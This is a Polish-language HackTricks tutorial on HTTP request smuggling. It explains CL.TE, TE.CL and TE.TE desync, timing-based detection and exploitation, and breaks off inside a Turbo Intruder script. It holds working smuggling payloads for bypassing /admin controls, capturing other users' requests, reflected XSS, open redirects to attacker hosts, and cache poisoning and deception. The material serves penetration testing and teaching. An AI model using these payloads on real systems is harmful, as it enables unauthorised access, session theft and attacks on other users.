# Atak na Przesyanie 呕da HTTP / Atak Desynchronizacji HTTP

<details>

<summary><strong>Naucz si hakowa AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeli chcesz zobaczy swoj **firm reklamowan w HackTricks** lub **pobra HackTricks w formacie PDF**, sprawd藕 [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* Zdobd藕 [**oficjalne gad偶ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzin PEASS**](https://opensea.io/collection/the-peass-family), nasz kolekcj ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Docz do**  [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **led藕** nas na **Twitterze**  [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podziel si swoimi sztuczkami hakerskimi, przesyajc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) na GitHubie.

</details>

## Co to jest

Ta podatno wystpuje, gdy **desynchronizacja** midzy **serwerami proxy front-end** a **serwerem back-end** pozwala **atakujcemu** na **wysanie** 偶dania HTTP, kt贸re zostanie **zinterpretowane** jako **jedno 偶danie** przez **serwery proxy front-end** (bilansowanie obci偶enia/przekierowanie) i **jako 2 偶dania** przez **serwer back-end**.\
Umo偶liwia to u偶ytkownikowi **modyfikacj nastpnego 偶dania, kt贸re dotrze do serwera back-end po jego**.

### Teoria

[**Specyfikacja RFC (2161)**](https://tools.ietf.org/html/rfc2616)

> Jeli wiadomo zostanie otrzymana zar贸wno z polem nag贸wka Transfer-Encoding, jak i polem nag贸wka Content-Length, to to drugie MUSI zosta zignorowane.

**Content-Length**

> Nag贸wek encji Content-Length wskazuje rozmiar ciaa encji, w bajtach, wysanej do odbiorcy.

**Transfer-Encoding: chunked**

> Nag贸wek Transfer-Encoding okrela form kodowania u偶ywanego do bezpiecznego przesyania treci adunku do u偶ytkownika.\
> Chunked oznacza, 偶e du偶e dane s wysyane w serii kawak贸w.

### Rzeczywisto

**Serwer Front-End** (bilansowanie obci偶enia/przekierowanie) **przetwarza** nag贸wek _**content-length**_ lub _**transfer-encoding**_, a **serwer Back-End przetwarza drugi**, co powoduje **desynchronizacj** midzy tymi dwoma systemami.\
Mo偶e to by bardzo krytyczne, poniewa偶 **atakujcy bdzie w stanie wysa jedno 偶danie** do serwera odwrotnego proxy, kt贸re zostanie **zinterpretowane** przez **serwer back-end jako 2 r贸偶ne 偶dania**. **Niebezpieczestwo** tej techniki polega na tym, 偶e **serwer back-end zinterpretuje 2. wstrzyknite 偶danie** tak, jakby **pochodzio od nastpnego klienta**, a **rzeczywiste 偶danie** tego klienta bdzie **czci** **wstrzyknitego 偶dania**.

### Szczeg贸lne przypadki

Pamitaj, 偶e w protokole HTTP **znak nowej linii skada si z 2 bajt贸w:**

* **Content-Length**: Ten nag贸wek u偶ywa **liczby dziesitnej** do wskazania **liczby** **bajt贸w** ciaa 偶dania. Oczekuje si, 偶e ciao zakoczy si na ostatnim znaku, **nie jest wymagana nowa linia na kocu 偶dania**.
* **Transfer-Encoding:** Ten nag贸wek u偶ywa w **ciale** **liczby szesnastkowej** do wskazania **liczby** **bajt贸w** **nastpnego kawaka**. **Kawaek** musi **zakoczy si** now lini, ale ta nowa linia **nie jest uwzgldniana** przez wska藕nik dugoci. Ten spos贸b przesyania musi zakoczy si **kawakiem o rozmiarze 0, po kt贸rym nastpuj 2 nowe linie**: `0`
* **Connection**: Na podstawie mojego dowiadczenia zaleca si u偶ycie **`Connection: keep-alive`** w pierwszym 偶daniu ataku na przesyanie 偶da.

## Podstawowe Przykady

{% hint style="success" %}
Pr贸bujc wykorzysta to za pomoc Burp Suite, **wycz opcje `Update Content-Length` i `Normalize HTTP/1 line endings`** w powtarzaczu, poniewa偶 niekt贸re gad偶ety nadu偶ywaj znak贸w nowej linii, powrot贸w karetki i bdnych dugoci treci.
{% endhint %}

Ataki na przesyanie 偶da HTTP s tworzone poprzez wysyanie dwuznacznych 偶da, kt贸re wykorzystuj rozbie偶noci w interpretacji nag贸wk贸w `Content-Length` (CL) i `Transfer-Encoding` (TE) przez serwery front-end i back-end. Te ataki mog przybiera r贸偶ne formy, g贸wnie jako **CL.TE**, **TE.CL** i **TE.TE**. Ka偶dy typ reprezentuje unikalne poczenie sposob贸w, w jaki serwery front-end i back-end priorytetyzuj te nag贸wki. Podatnoci wynikaj z przetwarzania tego samego 偶dania przez serwery w r贸偶ny spos贸b, prowadzc do nieoczekiwanych i potencjalnie zoliwych rezultat贸w.

### Podstawowe Przykady Typ贸w Podatnoci

![https://twitter.com/SpiderSec/status/1200413390339887104?ref\_src=twsrc%5Etfw%7Ctwcamp%5Etweetembed%7Ctwterm%5E1200413390339887104\&ref\_url=https%3A%2F%2Ftwitter.com%2FSpiderSec%2Fstatus%2F1200413390339887104](../../.gitbook/assets/EKi5edAUUAAIPIK.jpg)

#### Podatno CL.TE (Content-Length u偶ywane przez Front-End, Transfer-Encoding u偶ywane przez Back-End)

* **Front-End (CL):** Przetwarza 偶danie na podstawie nag贸wka `Content-Length`.
* **Back-End (TE):** Przetwarza 偶danie na podstawie nag贸wka `Transfer-Encoding`.
* **Scenariusz Ataku:**
* Atakujcy wysya 偶danie, w kt贸rym warto nag贸wka `Content-Length` nie zgadza si z rzeczywist dugoci treci.
* Serwer front-end przekazuje cae 偶danie do serwera back-end, na podstawie wartoci `Content-Length`.
* Serwer back-end przetwarza 偶danie jako kawakowane ze wzgldu na nag贸wek `Transfer-Encoding: chunked`, interpretujc pozostae dane jako oddzielne, nastpne 偶danie.
*   **Przykad:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 30
Connection: keep-alive
Transfer-Encoding: chunked

0

GET /404 HTTP/1.1
Foo: x
```

#### Podatno TE.CL (Transfer-Encoding u偶ywane przez Front-End, Content-Length u偶ywane przez Back-End)

* **Front-End (TE):** Przetwarza 偶danie na podstawie nag贸wka `Transfer-Encoding`.
* **Back-End (CL):** Przetwarza 偶danie na podstawie nag贸wka `Content-Length`.
* **Scenariusz Ataku:**
* Atakujcy wysya kawakowane 偶danie, gdzie rozmiar kawaka (`7b`) i rzeczywista dugo treci (`Content-Length: 4`) nie zgadzaj si.
* Serwer front-end, respektujc `Transfer-Encoding`, przekazuje cae 偶danie do serwera back-end.
* Serwer back-end, respektujc `Content-Length`, przetwarza jedynie pocztkow cz 偶dania (`7b` bajt贸w), pozostawiajc reszt jako cz niezamierzonego, nastpnego 偶dania.
*   **Przykad:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 4
Connection: keep-alive
Transfer-Encoding: chunked

7b
GET /404 HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 30

x=
0

```
#### Vulnerability TE.TE (Transfer-Encoding u偶ywane przez obie strony, z zaciemnieniem)

* **Serwery:** Oba obsuguj `Transfer-Encoding`, ale jeden mo偶na oszuka, ignorujc go za pomoc zaciemnienia.
* **Scenariusz ataku:**
* Atakujcy wysya 偶danie z zaciemnionymi nag贸wkami `Transfer-Encoding`.
* W zale偶noci od tego, kt贸ry serwer (front-end lub back-end) nie rozpoznaje zaciemnienia, mo偶e zosta wykorzystana podatno CL.TE lub TE.CL.
* Nieprzetworzona cz 偶dania, widziana przez jeden z serwer贸w, staje si czci kolejnego 偶dania, co prowadzi do przemytu.
*   **Przykad:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: xchunked
Transfer-Encoding : chunked
Transfer-Encoding: chunked
Transfer-Encoding: x
Transfer-Encoding: chunked
Transfer-Encoding: x
Transfer-Encoding:[tab]chunked
[space]Transfer-Encoding: chunked
X: X[\n]Transfer-Encoding: chunked

Transfer-Encoding
: chunked
```

#### **Scenariusz CL.CL (Content-Length u偶ywane przez obie strony, zar贸wno front-end, jak i back-end):**

* Oba serwery przetwarzaj 偶danie wycznie na podstawie nag贸wka `Content-Length`.
* Ten scenariusz zazwyczaj nie prowadzi do przemytu, poniewa偶 oba serwery interpretuj dugo 偶dania w spos贸b zgodny.
*   **Przykad:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 16
Connection: keep-alive

Normalne 偶danie
```

#### **Scenariusz CL != 0:**

* Dotyczy scenariuszy, w kt贸rych nag贸wek `Content-Length` jest obecny i ma warto inn ni偶 zero, co wskazuje, 偶e ciao 偶dania zawiera tre.
* Jest to istotne przy zrozumieniu i tworzeniu atak贸w przemytu, poniewa偶 wpywa na to, w jaki spos贸b serwery okrelaj koniec 偶dania.
*   **Przykad:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 16
Connection: keep-alive

Ciao nie jest puste
```

#### Wymuszanie za pomoc nag贸wk贸w hop-by-hop

Wykorzystujc nag贸wki hop-by-hop, mo偶na wskaza serwerowi proxy, aby **usun nag贸wek Content-Length lub Transfer-Encoding, co umo偶liwia przemyt 偶dania HTTP**.
```
Connection: Content-Length
```
Dla **wicej informacji na temat nag贸wk贸w hop-by-hop** odwied藕:

{% content-ref url="../abusing-hop-by-hop-headers.md" %}
[abusing-hop-by-hop-headers.md](../abusing-hop-by-hop-headers.md)
{% endcontent-ref %}

## Odkrywanie Smuglowania 呕da HTTP

Identyfikacja podatnoci na smuglowanie 偶da HTTP czsto mo偶e by osignita za pomoc technik czasowych, kt贸re polegaj na obserwowaniu, jak dugo serwer potrzebuje na odpowied藕 na manipulowane 偶dania. Te techniki s szczeg贸lnie przydatne do wykrywania podatnoci CL.TE i TE.CL. Opr贸cz tych metod istniej inne strategie i narzdzia, kt贸re mo偶na wykorzysta do znalezienia takich podatnoci:

### Znajdowanie Podatnoci CL.TE Za Pomoc Technik Czasowych

* **Metoda:**
* Wylij 偶danie, kt贸re w przypadku podatnoci aplikacji spowoduje, 偶e serwer back-endowy bdzie czeka na dodatkowe dane.
*   **Przykad:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 4

1
A
0
```
* **Obserwacja:**
* Serwer front-endowy przetwarza 偶danie na podstawie `Content-Length` i przerywa przekazywanie wiadomoci przedwczenie.
* Serwer back-endowy, oczekujc na wiadomo w postaci kawak贸w, czeka na kolejny kawaek, kt贸ry nigdy nie przychodzi, powodujc op贸藕nienie.
* **Wska藕niki:**
* Przekroczenia czasu lub dugie op贸藕nienia w odpowiedzi.
* Otrzymanie bdu 400 Bad Request od serwera back-endowego, czasami z szczeg贸owymi informacjami o serwerze.

### Znajdowanie Podatnoci TE.CL Za Pomoc Technik Czasowych

* **Metoda:**
* Wylij 偶danie, kt贸re w przypadku podatnoci aplikacji spowoduje, 偶e serwer back-endowy bdzie czeka na dodatkowe dane.
*   **Przykad:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 6

0
X
```
* **Obserwacja:**
* Serwer front-endowy przetwarza 偶danie na podstawie `Transfer-Encoding` i przekazuje ca wiadomo.
* Serwer back-endowy, oczekujc na wiadomo na podstawie `Content-Length`, czeka na dodatkowe dane, kt贸re nigdy nie przychodz, powodujc op贸藕nienie.

### Inne Metody Znajdowania Podatnoci

* **Analiza R贸偶nicowa Odpowiedzi:**
* Wylij nieco zr贸偶nicowane wersje 偶dania i obserwuj, czy odpowiedzi serwera r贸偶ni si w niespodziewany spos贸b, wskazujc na rozbie偶no w parsowaniu.
* **U偶ycie Narzdzi Automatyzujcych:**
* Narzdzia takie jak rozszerzenie 'HTTP Request Smuggler' w Burp Suite mog automatycznie testowa te podatnoci, wysyajc r贸偶ne formy niejednoznacznych 偶da i analizujc odpowiedzi.
* **Testy Zmiennoci Dugoci Zawartoci:**
* Wylij 偶dania z r贸偶nymi wartociami `Content-Length`, kt贸re nie s zgodne z rzeczywist dugoci zawartoci i obserwuj, jak serwer radzi sobie z takimi niezgodnociami.
* **Testy Zmiennoci Transfer-Encoding:**
* Wylij 偶dania z zasonitymi lub znieksztaconymi nag贸wkami `Transfer-Encoding` i monitoruj, jak r贸偶nie serwery front-endowy i back-endowy reaguj na takie manipulacje.

### Testowanie Podatnoci na Smuglowanie 呕da HTTP

Po potwierdzeniu skutecznoci technik czasowych, istotne jest zweryfikowanie, czy 偶dania klienta mo偶na manipulowa. Prost metod jest pr贸ba zatrucia twoich 偶da, na przykad wysanie 偶dania do `/` powinno skutkowa odpowiedzi 404. Przykady `CL.TE` i `TE.CL` om贸wione wczeniej w [Podstawowe Przykady](./#basic-examples) pokazuj, jak zatru 偶danie klienta, aby wywoa odpowied藕 404, mimo 偶e klient chce uzyska dostp do innych zasob贸w.

**Kluczowe Rozwa偶ania**

Podczas testowania podatnoci na smuglowanie 偶da poprzez ingerencj w inne 偶dania, pamitaj o:

* **Odrbne Poczenia Sieciowe:** "Atak" i "normalne" 偶dania powinny by wysyane przez oddzielne poczenia sieciowe. U偶ycie tego samego poczenia dla obu nie potwierdza obecnoci podatnoci.
* **Sp贸jne URL i Parametry:** Staraj si u偶ywa identycznych adres贸w URL i nazw parametr贸w dla obu 偶da. Nowoczesne aplikacje czsto kieruj 偶dania do konkretnych serwer贸w back-endowych na podstawie adresu URL i parametr贸w. Dopasowanie ich zwiksza prawdopodobiestwo, 偶e oba 偶dania zostan przetworzone przez ten sam serwer, co jest warunkiem koniecznym do udanego ataku.
* **Warunki Czasowe i Wycigowe:** "Normalne" 偶danie, majce na celu wykrycie ingerencji z "atakujcego" 偶dania, rywalizuje z innymi r贸wnoczesnymi 偶daniami aplikacji. Dlatego wylij "normalne" 偶danie bezporednio po "atakujcym" 偶daniu. W przypadku ruchliwych aplikacji mo偶e by konieczne przeprowadzenie kilku pr贸b dla potwierdzenia podatnoci.
* **Wyzwania Zwizane z Rozdziaem Obci偶enia:** Serwery front-endowe dziaajce jako r贸wnowa偶niki obci偶enia mog rozprowadza 偶dania na r贸偶ne systemy back-endowe. Jeli "atakujce" i "normalne" 偶dania trafi na r贸偶ne systemy, atak si nie powiedzie. Ten aspekt r贸wnowa偶enia obci偶enia mo偶e wymaga kilku pr贸b potwierdzenia podatnoci.
* **Nieprzewidziane Skutki Dla U偶ytkownika:** Jeli tw贸j atak przypadkowo wpywa na 偶danie innego u偶ytkownika (nie jest to "normalne" 偶danie wysane do wykrycia), oznacza to, 偶e tw贸j atak wpyn na innego u偶ytkownika aplikacji. Cige testowanie mo偶e zak贸ci innych u偶ytkownik贸w, wymagajc ostro偶nego podejcia.

## Nadu偶ywanie Smuglowania 呕da HTTP

### Aby omin kontrole bezpieczestwa front-endu

### Ominiecie Kontroli Bezpieczestwa Front-Endu za Porednictwem Smuglowania 呕da HTTP

Czasami proksy front-endowe narzucaj rodki bezpieczestwa, analizujc przychodzce 偶dania. Jednak te rodki mog zosta zlekcewa偶one poprzez wykorzystanie Smuglowania 呕da HTTP, umo偶liwiajc nieautoryzowany dostp do ograniczonych punkt贸w kocowych. Na przykad dostp do `/admin` mo偶e by zablokowany z zewntrz, a proksy front-endowe aktywnie blokuj takie pr贸by. Niemniej jednak ten proxy mo偶e zaniedba sprawdzenie osadzonych 偶da wewntrz smuglowanego 偶dania HTTP, pozostawiajc ptl do omijania tych ogranicze.

Rozwa偶 poni偶sze przykady ilustrujce, jak Smuglowanie 呕da HTTP mo偶e by wykorzystane do ominiecia kontroli bezpieczestwa front-endu, szczeg贸lnie celujc w cie偶k `/admin`, kt贸ra zazwyczaj jest chroniona przez proxy front-endowe:

**Przykad CL.TE**
```
POST / HTTP/1.1
Host: [redacted].web-security-academy.net
Cookie: session=[redacted]
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 67
Transfer-Encoding: chunked

0
GET /admin HTTP/1.1
Host: localhost
Content-Length: 10

x=
```
W ataku CL.TE nag贸wek `Content-Length` jest wykorzystywany do pocztkowego 偶dania, podczas gdy osadzone 偶danie wykorzystuje nag贸wek `Transfer-Encoding: chunked`. Przekierowanie front-endowe przetwarza pocztkowe 偶danie `POST`, ale nie sprawdza osadzonego 偶dania `GET /admin`, co umo偶liwia nieautoryzowany dostp do cie偶ki `/admin`.

**Przykad TE.CL**
```
POST / HTTP/1.1
Host: [redacted].web-security-academy.net
Cookie: session=[redacted]
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive
Content-Length: 4
Transfer-Encoding: chunked
2b
GET /admin HTTP/1.1
Host: localhost
a=x
0

```
W przeciwnym razie, w ataku TE.CL pocztkowe 偶danie `POST` u偶ywa `Transfer-Encoding: chunked`, a nastpne osadzone 偶danie jest przetwarzane na podstawie nag贸wka `Content-Length`. Podobnie jak w ataku CL.TE, proxy front-endowy pomija przemycone 偶danie `GET /admin`, niechccy przyznajc dostp do ograniczonej cie偶ki `/admin`.

### Ujawnianie przepisywania 偶dania front-endowego <a href="#revealing-front-end-request-rewriting" id="revealing-front-end-request-rewriting"></a>

Aplikacje czsto wykorzystuj **serwer front-endowy** do modyfikowania przychodzcych 偶da przed przekazaniem ich do serwera back-endowego. Typow modyfikacj jest dodawanie nag贸wk贸w, takich jak `X-Forwarded-For: <IP klienta>`, aby przekaza IP klienta do serwera back-endowego. Zrozumienie tych modyfikacji mo偶e by kluczowe, poniewa偶 mo偶e ujawni sposoby **omijania zabezpiecze** lub **odkrywania ukrytych informacji lub punkt贸w kocowych**.

Aby zbada, w jaki spos贸b proxy zmienia 偶danie, zlokalizuj parametr POST, kt贸ry serwer back-endowy odbija w odpowiedzi. Nastpnie stw贸rz 偶danie, u偶ywajc tego parametru na kocu, podobnie jak w poni偶szym przykadzie:
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 130
Connection: keep-alive
Transfer-Encoding: chunked

0

POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 100

search=
```
W tej strukturze kolejne skadniki 偶dania s dodawane po `search=`, kt贸ry jest parametrem odzwierciedlonym w odpowiedzi. To odzwierciedlenie ujawni nag贸wki kolejnego 偶dania.

Wa偶ne jest dopasowanie nag贸wka `Content-Length` zagnie偶d偶onego 偶dania do rzeczywistej dugoci treci. Zaleca si rozpoczcie od niewielkiej wartoci i stopniowe zwikszanie, poniewa偶 zbyt niska warto spowoduje ucicie odzwierciedlonych danych, podczas gdy zbyt wysoka warto mo偶e spowodowa bd 偶dania.

Ta technika jest r贸wnie偶 stosowana w kontekcie podatnoci TE.CL, ale 偶danie powinno zakoczy si `search=\r\n0`. Bez wzgldu na znaki nowej linii, wartoci zostan doczone do parametru wyszukiwania.

Ta metoda su偶y g贸wnie do zrozumienia modyfikacji 偶dania dokonanych przez proxy front-end, co w zasadzie stanowi autorsk analiz.

### Przechwytywanie 偶da innych u偶ytkownik贸w <a href="#capturing-other-users-requests" id="capturing-other-users-requests"></a>

Mo偶liwe jest przechwycenie 偶da nastpnego u偶ytkownika, dodajc okrelone 偶danie jako warto parametru podczas operacji POST. Oto jak to mo偶na osign:

Dodajc poni偶sze 偶danie jako warto parametru, mo偶na przechowywa 偶danie nastpnego klienta:
```
POST / HTTP/1.1
Host: ac031feb1eca352f8012bbe900fa00a1.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 319
Connection: keep-alive
Cookie: session=4X6SWQeR8KiOPZPF2Gpca2IKeA1v4KYi
Transfer-Encoding: chunked

0

POST /post/comment HTTP/1.1
Host: ac031feb1eca352f8012bbe900fa00a1.web-security-academy.net
Content-Length: 659
Content-Type: application/x-www-form-urlencoded
Cookie: session=4X6SWQeR8KiOPZPF2Gpca2IKeA1v4KYi

csrf=gpGAVAbj7pKq7VfFh45CAICeFCnancCM&postId=4&name=asdfghjklo&email=email%40email.com&comment=
```
W tym scenariuszu **parametr komentarza** ma przechowywa treci znajdujce si w sekcji komentarzy posta na publicznie dostpnej stronie. W rezultacie tre nastpnego 偶dania pojawi si jako komentarz.

Jednak ta technika ma swoje ograniczenia. Zazwyczaj przechwytuje dane tylko do ogranicznika parametru u偶ytego w przemyconym 偶daniu. Dla przesyek formularzy zakodowanych w formie URL, tym ogranicznikiem jest znak `&`. Oznacza to, 偶e przechwycone treci z 偶dania u偶ytkownika ofiary zatrzymaj si na pierwszym `&`, kt贸ry mo偶e nawet by czci cigu zapytania.

Dodatkowo warto zauwa偶y, 偶e to podejcie jest r贸wnie偶 wykonalne z wykorzystaniem podatnoci TE.CL. W takich przypadkach 偶danie powinno zakoczy si `search=\r\n0`. Bez wzgldu na znaki nowej linii, wartoci zostan doczone do parametru wyszukiwania.

### Wykorzystanie przemyconego 偶dania HTTP do eksploatacji odbitego XSS

Przemycone 偶danie HTTP mo偶e by wykorzystane do eksploatacji stron internetowych podatnych na **Odbity XSS**, oferujc znaczce korzyci:

* Interakcja z u偶ytkownikami docelowymi **nie jest wymagana**.
* Umo偶liwia eksploatacj XSS w czciach 偶dania, do kt贸rych normalnie **nie mo偶na uzyska dostpu**, takich jak nag贸wki 偶dania HTTP.

W przypadkach, gdy strona internetowa jest podatna na Odbity XSS poprzez nag贸wek User-Agent, poni偶szy adunek demonstruje, jak mo偶na wykorzysta t podatno:
```
POST / HTTP/1.1
Host: ac311fa41f0aa1e880b0594d008d009e.web-security-academy.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0
Cookie: session=ac311fa41f0aa1e880b0594d008d009e
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 213
Content-Type: application/x-www-form-urlencoded

0

GET /post?postId=2 HTTP/1.1
Host: ac311fa41f0aa1e880b0594d008d009e.web-security-academy.net
User-Agent: "><script>alert(1)</script>
Content-Length: 10
Content-Type: application/x-www-form-urlencoded

A=
```
Ten payload jest skonstruowany w celu wykorzystania podatnoci poprzez:

1. Zainicjowanie 偶dania `POST`, pozornie typowego, z nag贸wkiem `Transfer-Encoding: chunked`, aby wskaza pocztek smugglowania.
2. Nastpnie, zastosowanie `0`, oznaczajce zakoczenie ciaa wiadomoci w formacie chunked.
3. Nastpnie wprowadzone jest smugglowane 偶danie `GET`, gdzie nag贸wek `User-Agent` jest zainfekowany skryptem, `<script>alert(1)</script>`, wywoujc XSS podczas przetwarzania tego kolejnego 偶dania przez serwer.

Poprzez manipulowanie `User-Agent` poprzez smugglowanie, payload omija normalne ograniczenia 偶dania, wykorzystujc w ten spos贸b podatno na Reflected XSS w nietypowy, ale skuteczny spos贸b.

### Wykorzystanie smugglowania 偶dania HTTP do zamiany przekierowania wewntrznego na otwarte przekierowanie <a href="#using-http-request-smuggling-to-turn-an-on-site-redirect-into-an-open-redirect" id="using-http-request-smuggling-to-turn-an-on-site-redirect-into-an-open-redirect"></a>

### Wykorzystanie Przekierowa Wewntrznych z U偶yciem Smugglowania 呕dania HTTP <a href="#exploiting-on-site-redirects-with-http-request-smuggling" id="exploiting-on-site-redirects-with-http-request-smuggling"></a>

Aplikacje czsto przekierowuj z jednego adresu URL na inny, korzystajc z nazwy hosta z nag贸wka `Host` w adresie URL przekierowania. Jest to powszechne w serwerach WWW, takich jak Apache i IIS. Na przykad, 偶danie folderu bez ukonika na kocu skutkuje przekierowaniem, aby zawiera ten ukonik:
```
GET /home HTTP/1.1
Host: normal-website.com
```
Wyniki:
```
HTTP/1.1 301 Moved Permanently
Location: https://normal-website.com/home/
```
Chocia偶 na pierwszy rzut oka wydaje si nieszkodliwe, to to zachowanie mo偶e by manipulowane za pomoc przemytu 偶da HTTP, aby przekierowa u偶ytkownik贸w na zewntrzn stron. Na przykad:
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 54
Connection: keep-alive
Transfer-Encoding: chunked

0

GET /home HTTP/1.1
Host: attacker-website.com
Foo: X
```
To przemycony 偶danie mo偶e spowodowa przekierowanie nastpnego przetworzonego 偶dania u偶ytkownika na stron kontrolowan przez atakujcego:
```
GET /home HTTP/1.1
Host: attacker-website.com
Foo: XGET /scripts/include.js HTTP/1.1
Host: vulnerable-website.com
```
Wyniki:
```
HTTP/1.1 301 Moved Permanently
Location: https://attacker-website.com/home/
```
### Wykorzystanie przekierowania 偶dania HTTP do przeprowadzenia zatrucia pamici podrcznej sieci Web

Zatrucie pamici podrcznej sieci Web mo偶na przeprowadzi, jeli kt贸rykolwiek z komponent贸w **infrastruktury front-end** przechowuje w pamici podrcznej zawarto, zwykle w celu poprawy wydajnoci. Poprzez manipulowanie odpowiedzi serwera mo偶liwe jest **zatrucie pamici podrcznej**.

Wczeniej obserwowalimy, jak odpowiedzi serwera mog by zmieniane, aby zwraca bd 404 (patrz [Podstawowe przykady](./#basic-examples)). Podobnie, mo偶liwe jest oszukanie serwera, aby dostarczy zawarto `/index.html` w odpowiedzi na 偶danie pliku `/static/include.js`. W rezultacie zawarto `/static/include.js` zostaje zastpiona w pamici podrcznej zawartoci `/index.html`, co sprawia, 偶e `/static/include.js` staje si niedostpny dla u偶ytkownik贸w, potencjalnie prowadzc do ataku typu Denial of Service (DoS).

Ta technika staje si szczeg贸lnie skuteczna, jeli odkryto **podatno na przekierowanie otwarte** lub jeli istnieje **przekierowanie na stronie do przekierowania otwartego**. Takie podatnoci mog by wykorzystane do zastpienia zawartoci w pamici podrcznej `/static/include.js` skryptem kontrolowanym przez atakujcego, umo偶liwiajc szeroko zakrojony atak typu Cross-Site Scripting (XSS) przeciwko wszystkim klientom 偶dajcym zaktualizowanego `/static/include.js`.

Poni偶ej znajduje si ilustracja wykorzystania **zatrucia pamici podrcznej w poczeniu z przekierowaniem na stronie do przekierowania otwartego**. Celem jest zmiana zawartoci pamici podrcznej `/static/include.js`, aby dostarczy kod JavaScript kontrolowany przez atakujcego:
```
POST / HTTP/1.1
Host: vulnerable.net
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive
Content-Length: 124
Transfer-Encoding: chunked

0

GET /post/next?postId=3 HTTP/1.1
Host: attacker.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=1
```
Zauwa偶 osadzone 偶danie kierujce do `/post/next?postId=3`. To 偶danie zostanie przekierowane do `/post?postId=4`, wykorzystujc **warto nag贸wka Host** do okrelenia domeny. Poprzez zmian **nag贸wka Host**, atakujcy mo偶e przekierowa 偶danie do swojej domeny (**przekierowanie na stron atakujcego do otwartego przekierowania**).

Po udanym **zatruciu gniazda**, nale偶y zainicjowa **偶danie GET** dla `/static/include.js`. To 偶danie zostanie zanieczyszczone przez wczeniejsze 偶danie **przekierowania na stron atakujcego do otwartego przekierowania** i pobierze zawarto skryptu kontrolowanego przez atakujcego.

Nastpnie, ka偶de 偶danie dla `/static/include.js` bdzie serwowa zbuforowan zawarto skryptu atakujcego, efektywnie uruchamiajc szeroki atak XSS.

### U偶ycie przemytu 偶da HTTP do przeprowadzenia oszustwa zwizane z pamici podrczn sieciow <a href="#using-http-request-smuggling-to-perform-web-cache-deception" id="using-http-request-smuggling-to-perform-web-cache-deception"></a>

> **Jaka jest r贸偶nica midzy zatruciem pamici podrcznej sieciowej a oszustwem zwizanym z pamici podrczn sieciow?**
>
> * W **zatruciu pamici podrcznej sieciowej**, atakujcy powoduje, 偶e aplikacja przechowuje pewn zoliw zawarto w pamici podrcznej, a ta zawarto jest serwowana z pamici podrcznej innym u偶ytkownikom aplikacji.
> * W **oszustwie zwizanym z pamici podrczn sieciow**, atakujcy powoduje, 偶e aplikacja przechowuje pewn wra偶liw zawarto nale偶c do innego u偶ytkownika w pamici podrcznej, a nastpnie atakujcy odzyskuje t zawarto z pamici podrcznej.

Atakujcy tworzy przemycone 偶danie, kt贸re pobiera wra偶liw zawarto specyficzn dla u偶ytkownika. Rozwa偶 poni偶szy przykad:
```markdown
`POST / HTTP/1.1`\
`Host: vulnerable-website.com`\
`Connection: keep-alive`\
`Content-Length: 43`\
`Transfer-Encoding: chunked`\
``\ `0`\``\
`GET /private/messages HTTP/1.1`\
`Foo: X`
```
Jeli ten przemycony 偶danie zatruje wpis w pamici podrcznej przeznaczony dla treci statycznych (np. `/someimage.png`), wra偶liwe dane ofiary z `/private/messages` mog zosta zapisane w pamici podrcznej pod wpisem dla treci statycznej. W rezultacie atakujcy m贸gby potencjalnie odzyska te zapisane wra偶liwe dane.

### Uzbrojenie HTTP Request Smuggling z Desynchronizacj Odpowiedzi HTTP

Czy znalaze jak podatno na HTTP Request Smuggling i nie wiesz, jak j wykorzysta? Spr贸buj tej innej metody eksploatacji:

{% content-ref url="../http-response-smuggling-desync.md" %}
[http-response-smuggling-desync.md](../http-response-smuggling-desync.md)
{% endcontent-ref %}

## Skrypty Turbo Intruder

### CL.TE

Z [https://hipotermia.pw/bb/http-desync-idor](https://hipotermia.pw/bb/http-desync-idor)
```python
def queueRequests(target, wordlists):

engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
resumeSSL=False,
timeout=10,
pipeline=False,
maxRetriesPerRequest=0,
engine=Engine.THREADED,
)
engine.start()

attack = '''POST / HTTP/1.1
Transfer-Encoding: chunked
Host: xxx.com
Content-Length: 35
Foo: bar

0

GET /admin7 HTTP/1.1
X-Foo: k'''

engine.queue(attack)

victim = '''GET / HTTP/1.1
Host: xxx.com

'''
for i in range(14):
engine.queue(victim)
time.sleep(0.05)

def handleResponse(req, interesting):
table.add(req)
```
### TE.CL

Z: [https://hipotermia.pw/bb/http-desync-account-takeover](https://hipotermia.pw/bb/http-desync-account-takeover)
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
resumeSSL=False,
timeout=10,
pipeline=False,
